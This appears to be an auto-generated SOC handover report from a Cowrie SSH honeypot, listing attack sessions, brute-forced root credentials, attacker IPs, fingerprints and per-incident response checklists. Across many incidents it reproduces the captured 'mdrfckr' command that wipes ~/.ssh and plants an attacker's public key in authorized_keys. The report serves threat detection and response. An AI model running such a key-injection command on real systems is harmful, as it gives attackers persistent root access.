# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-05-27 |
| **Generated At** | 2026-05-27T20:23:51Z |
| **Shift Time** | 20:23 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **97** |
| Confirmed Threats | **88** |
| False Positives Filtered | **9** (9.3%) |
| Unique Attacker IPs | **30** |
| Countries of Origin | **10** |
| High Severity Cases | **29** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **68** |
| Malware Samples Analyzed | **0** HIGH · **16** MED · 4 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **53** |
| Unique Credential Pairs | **26** |
| Unique Usernames | **12** |
| Unique Passwords | **26** |
| Successful Auth Pairs | **21** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 29 |
| `345gs5662d34` | 13 |
| `admin` | 2 |
| `nextcloud` | 1 |
| `jenkins` | 1 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `3245gs5662d34` | 14 |
| `345gs5662d34` | 13 |
| `fjbdfdjkdsfs541544` | 2 |
| `qwe1314520` | 2 |
| `India@2023` | 1 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `root` | `3245gs5662d34` | 14 |
| `345gs5662d34` | `345gs5662d34` | 13 |
| `admin` | `fjbdfdjkdsfs541544` | 2 |
| `root` | `qwe1314520` | 2 |
| `root` | `India@2023` | 1 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `India@2023` | `23.95.132.61` | 2026-05-27T17:24:31 |
| `root` | `3245gs5662d34` | `23.95.132.61` | 2026-05-27T17:24:38 |
| `root` | `1z2x3c4v5b` | `84.33.121.224` | 2026-05-27T17:26:09 |
| `root` | `3245gs5662d34` | `84.33.121.224` | 2026-05-27T17:26:12 |
| `root` | `123456Ww` | `101.126.82.218` | 2026-05-27T17:28:49 |
| `root` | `3245gs5662d34` | `101.126.82.218` | 2026-05-27T17:28:59 |
| `root` | `Hl123456.` | `101.126.82.218` | 2026-05-27T17:29:54 |
| `root` | `1qaz!QAZ2wsx@WSX` | `101.126.82.218` | 2026-05-27T17:30:11 |
| `root` | `vps2024` | `101.126.82.218` | 2026-05-27T17:31:10 |
| `root` | `Www123123` | `189.147.19.238` | 2026-05-27T18:46:46 |
| `root` | `3245gs5662d34` | `189.147.19.238` | 2026-05-27T18:46:53 |
| `root` | `qwe1314520` | `101.36.109.176` | 2026-05-27T18:47:21 |
| `root` | `3245gs5662d34` | `101.36.109.176` | 2026-05-27T18:47:24 |
| `root` | `!QAZ2wsx#EDC` | `34.71.30.159` | 2026-05-27T18:55:36 |
| `root` | `3245gs5662d34` | `34.71.30.159` | 2026-05-27T18:55:42 |
| `root` | `Cloud12#$` | `27.128.171.39` | 2026-05-27T18:56:01 |
| `root` | `ngf1r3wall` | `34.71.30.159` | 2026-05-27T18:59:09 |
| `root` | `qwe1314520` | `34.71.30.159` | 2026-05-27T19:02:45 |
| `root` | `abc1234.` | `34.71.30.159` | 2026-05-27T19:04:34 |
| `root` | `Qq123123` | `34.71.30.159` | 2026-05-27T19:06:54 |
| `root` | `Password123` | `34.71.30.159` | 2026-05-27T19:08:46 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **97** |
| Sessions with Fingerprint | **4** |
| Unique HASSH Fingerprints | **4** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 77 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `f555226df196...` | Mirai/variant | 37 | 7 |
| `03a80b21afa8...` | Modern SSH client | 36 | 6 |
| `af8223ac9914...` | libssh-based | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `f555226df196...` | libssh | 37 | 7 | Mirai/variant |
| `03a80b21afa8...` | libssh | 36 | 6 | Modern SSH client |
| `95420f9d932d...` | libssh | 3 | 3 | — |
| `af8223ac9914...` | libssh | 1 | 1 | libssh-based |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **1** |
| Campaign Clusters | **1** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 15 | 7 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `34.71.30.159`, `101.36.109.176`, `101.126.82.218`, `84.33.121.224`, `189.147.19.238`, `27.128.171.39`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **30** |
| Unique ASNs | **21** |
| High-Risk ASNs | **15** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS4134` | CHINANET BACKBONE | 5 | HIGH |
| `AS137718` | Beijing Volcano Engine Technology Co., Ltd. | 4 | HIGH |
| `AS8075` | Microsoft Corporation | 2 | HIGH |
| `AS396982` | Google LLC | 2 | HIGH |
| `AS14618` | Amazon.com, Inc. | 1 | MEDIUM |
| `AS55081` | 24 SHELLS | 1 | HIGH |
| `AS35612` | EOLO S.p.A. | 1 | HIGH |
| `AS139549` | Crisp Enterprises | 1 | LOW |

---

---

## 🚨 Priority Cases — Immediate Attention (29)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-e67d19e57796

| Field | Detail |
|---|---|
| **Source IP** | `23.95.132[.]61` |
| **First Seen** | 2026-05-27 17:24 |
| **Last Seen** | 2026-05-27 17:24 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-27 17:24:29` | `cowrie.session.connect` |
| `2026-05-27 17:24:29` | `cowrie.client.version` |
| `2026-05-27 17:24:30` | `cowrie.client.kex` |
| `2026-05-27 17:24:31` | `cowrie.login.success` |
| `2026-05-27 17:24:32` | `cowrie.session.params` |
| `2026-05-27 17:24:32` | `cowrie.command.input` |
| `2026-05-27 17:24:32` | `cowrie.command.failed` |
| `2026-05-27 17:24:32` | `cowrie.log.closed` |
| `2026-05-27 17:24:33` | `cowrie.session.params` |
| `2026-05-27 17:24:33` | `cowrie.command.input` |
| `2026-05-27 17:24:33` | `cowrie.session.file_download` |
| `2026-05-27 17:24:33` | `cowrie.log.closed` |
| `2026-05-27 17:24:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `23.95.132[.]61` to AbuseIPDB if not already reported
- [ ] Block `23.95.132[.]61` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d3ac5497fb35

| Field | Detail |
|---|---|
| **Source IP** | `23.95.132[.]61` |
| **First Seen** | 2026-05-27 17:24 |
| **Last Seen** | 2026-05-27 17:24 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-27 17:24:37` | `cowrie.session.connect` |
| `2026-05-27 17:24:37` | `cowrie.client.version` |
| `2026-05-27 17:24:37` | `cowrie.client.kex` |
| `2026-05-27 17:24:38` | `cowrie.login.success` |
| `2026-05-27 17:24:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `23.95.132[.]61` to AbuseIPDB if not already reported
- [ ] Block `23.95.132[.]61` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9a2e50e373ed

| Field | Detail |
|---|---|
| **Source IP** | `84.33.121[.]224` |
| **First Seen** | 2026-05-27 17:26 |
| **Last Seen** | 2026-05-27 17:26 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-27 17:26:08` | `cowrie.session.connect` |
| `2026-05-27 17:26:08` | `cowrie.client.version` |
| `2026-05-27 17:26:08` | `cowrie.client.kex` |
| `2026-05-27 17:26:09` | `cowrie.login.success` |
| `2026-05-27 17:26:09` | `cowrie.session.params` |
| `2026-05-27 17:26:09` | `cowrie.command.input` |
| `2026-05-27 17:26:09` | `cowrie.command.failed` |
| `2026-05-27 17:26:09` | `cowrie.log.closed` |
| `2026-05-27 17:26:09` | `cowrie.session.params` |
| `2026-05-27 17:26:09` | `cowrie.command.input` |
| `2026-05-27 17:26:09` | `cowrie.session.file_download` |
| `2026-05-27 17:26:09` | `cowrie.log.closed` |
| `2026-05-27 17:26:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `84.33.121[.]224` to AbuseIPDB if not already reported
- [ ] Block `84.33.121[.]224` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2bb995bafdbe

| Field | Detail |
|---|---|
| **Source IP** | `84.33.121[.]224` |
| **First Seen** | 2026-05-27 17:26 |
| **Last Seen** | 2026-05-27 17:26 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-27 17:26:12` | `cowrie.session.connect` |
| `2026-05-27 17:26:12` | `cowrie.client.version` |
| `2026-05-27 17:26:12` | `cowrie.client.kex` |
| `2026-05-27 17:26:12` | `cowrie.login.success` |
| `2026-05-27 17:26:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `84.33.121[.]224` to AbuseIPDB if not already reported
- [ ] Block `84.33.121[.]224` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2eea6ff41d4c

| Field | Detail |
|---|---|
| **Source IP** | `101.126.82[.]218` |
| **First Seen** | 2026-05-27 17:28 |
| **Last Seen** | 2026-05-27 17:29 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-27 17:28:47` | `cowrie.session.connect` |
| `2026-05-27 17:28:47` | `cowrie.client.version` |
| `2026-05-27 17:28:48` | `cowrie.client.kex` |
| `2026-05-27 17:28:49` | `cowrie.login.success` |
| `2026-05-27 17:28:49` | `cowrie.session.params` |
| `2026-05-27 17:28:49` | `cowrie.command.input` |
| `2026-05-27 17:28:49` | `cowrie.command.failed` |
| `2026-05-27 17:28:50` | `cowrie.log.closed` |
| `2026-05-27 17:28:51` | `cowrie.session.params` |
| `2026-05-27 17:28:51` | `cowrie.command.input` |
| `2026-05-27 17:28:51` | `cowrie.session.file_download` |
| `2026-05-27 17:28:51` | `cowrie.log.closed` |
| `2026-05-27 17:29:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.126.82[.]218` to AbuseIPDB if not already reported
- [ ] Block `101.126.82[.]218` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-18fa472936d0

| Field | Detail |
|---|---|
| **Source IP** | `101.126.82[.]218` |
| **First Seen** | 2026-05-27 17:28 |
| **Last Seen** | 2026-05-27 17:28 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-27 17:28:54` | `cowrie.session.connect` |
| `2026-05-27 17:28:54` | `cowrie.client.version` |
| `2026-05-27 17:28:55` | `cowrie.client.kex` |
| `2026-05-27 17:28:59` | `cowrie.login.success` |
| `2026-05-27 17:28:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.126.82[.]218` to AbuseIPDB if not already reported
- [ ] Block `101.126.82[.]218` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5db932ea4895

| Field | Detail |
|---|---|
| **Source IP** | `101.126.82[.]218` |
| **First Seen** | 2026-05-27 17:29 |
| **Last Seen** | 2026-05-27 17:30 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-27 17:29:51` | `cowrie.session.connect` |
| `2026-05-27 17:29:52` | `cowrie.client.version` |
| `2026-05-27 17:29:52` | `cowrie.client.kex` |
| `2026-05-27 17:29:54` | `cowrie.login.success` |
| `2026-05-27 17:29:56` | `cowrie.session.params` |
| `2026-05-27 17:29:56` | `cowrie.command.input` |
| `2026-05-27 17:29:56` | `cowrie.command.failed` |
| `2026-05-27 17:29:56` | `cowrie.log.closed` |
| `2026-05-27 17:29:56` | `cowrie.session.params` |
| `2026-05-27 17:29:56` | `cowrie.command.input` |
| `2026-05-27 17:29:56` | `cowrie.session.file_download` |
| `2026-05-27 17:29:56` | `cowrie.log.closed` |
| `2026-05-27 17:30:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.126.82[.]218` to AbuseIPDB if not already reported
- [ ] Block `101.126.82[.]218` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-33883597f6c2

| Field | Detail |
|---|---|
| **Source IP** | `101.126.82[.]218` |
| **First Seen** | 2026-05-27 17:29 |
| **Last Seen** | 2026-05-27 17:30 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-27 17:29:59` | `cowrie.session.connect` |
| `2026-05-27 17:29:59` | `cowrie.client.version` |
| `2026-05-27 17:30:00` | `cowrie.client.kex` |
| `2026-05-27 17:30:00` | `cowrie.login.success` |
| `2026-05-27 17:30:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.126.82[.]218` to AbuseIPDB if not already reported
- [ ] Block `101.126.82[.]218` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d41a32aefb79

| Field | Detail |
|---|---|
| **Source IP** | `101.126.82[.]218` |
| **First Seen** | 2026-05-27 17:30 |
| **Last Seen** | 2026-05-27 17:30 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-27 17:30:09` | `cowrie.session.connect` |
| `2026-05-27 17:30:09` | `cowrie.client.version` |
| `2026-05-27 17:30:10` | `cowrie.client.kex` |
| `2026-05-27 17:30:11` | `cowrie.login.success` |
| `2026-05-27 17:30:11` | `cowrie.session.params` |
| `2026-05-27 17:30:11` | `cowrie.command.input` |
| `2026-05-27 17:30:11` | `cowrie.command.failed` |
| `2026-05-27 17:30:11` | `cowrie.log.closed` |
| `2026-05-27 17:30:12` | `cowrie.session.params` |
| `2026-05-27 17:30:12` | `cowrie.command.input` |
| `2026-05-27 17:30:12` | `cowrie.session.file_download` |
| `2026-05-27 17:30:12` | `cowrie.log.closed` |
| `2026-05-27 17:30:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.126.82[.]218` to AbuseIPDB if not already reported
- [ ] Block `101.126.82[.]218` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e983abe2f299

| Field | Detail |
|---|---|
| **Source IP** | `101.126.82[.]218` |
| **First Seen** | 2026-05-27 17:30 |
| **Last Seen** | 2026-05-27 17:30 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-27 17:30:14` | `cowrie.session.connect` |
| `2026-05-27 17:30:15` | `cowrie.client.version` |
| `2026-05-27 17:30:15` | `cowrie.client.kex` |
| `2026-05-27 17:30:16` | `cowrie.login.success` |
| `2026-05-27 17:30:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.126.82[.]218` to AbuseIPDB if not already reported
- [ ] Block `101.126.82[.]218` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7f3f097cab35

| Field | Detail |
|---|---|
| **Source IP** | `101.126.82[.]218` |
| **First Seen** | 2026-05-27 17:31 |
| **Last Seen** | 2026-05-27 17:31 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-27 17:31:08` | `cowrie.session.connect` |
| `2026-05-27 17:31:09` | `cowrie.client.version` |
| `2026-05-27 17:31:09` | `cowrie.client.kex` |
| `2026-05-27 17:31:10` | `cowrie.login.success` |
| `2026-05-27 17:31:12` | `cowrie.session.params` |
| `2026-05-27 17:31:12` | `cowrie.command.input` |
| `2026-05-27 17:31:12` | `cowrie.command.failed` |
| `2026-05-27 17:31:12` | `cowrie.log.closed` |
| `2026-05-27 17:31:12` | `cowrie.session.params` |
| `2026-05-27 17:31:12` | `cowrie.command.input` |
| `2026-05-27 17:31:14` | `cowrie.session.file_download` |
| `2026-05-27 17:31:14` | `cowrie.log.closed` |
| `2026-05-27 17:31:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.126.82[.]218` to AbuseIPDB if not already reported
- [ ] Block `101.126.82[.]218` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1cfd0d2e3e3f

| Field | Detail |
|---|---|
| **Source IP** | `101.126.82[.]218` |
| **First Seen** | 2026-05-27 17:31 |
| **Last Seen** | 2026-05-27 17:31 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-27 17:31:19` | `cowrie.session.connect` |
| `2026-05-27 17:31:19` | `cowrie.client.version` |
| `2026-05-27 17:31:19` | `cowrie.client.kex` |
| `2026-05-27 17:31:20` | `cowrie.login.success` |
| `2026-05-27 17:31:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.126.82[.]218` to AbuseIPDB if not already reported
- [ ] Block `101.126.82[.]218` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6000885f963c

| Field | Detail |
|---|---|
| **Source IP** | `189.147.19[.]238` |
| **First Seen** | 2026-05-27 18:46 |
| **Last Seen** | 2026-05-27 18:46 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-27 18:46:45` | `cowrie.session.connect` |
| `2026-05-27 18:46:45` | `cowrie.client.version` |
| `2026-05-27 18:46:45` | `cowrie.client.kex` |
| `2026-05-27 18:46:46` | `cowrie.login.success` |
| `2026-05-27 18:46:47` | `cowrie.session.params` |
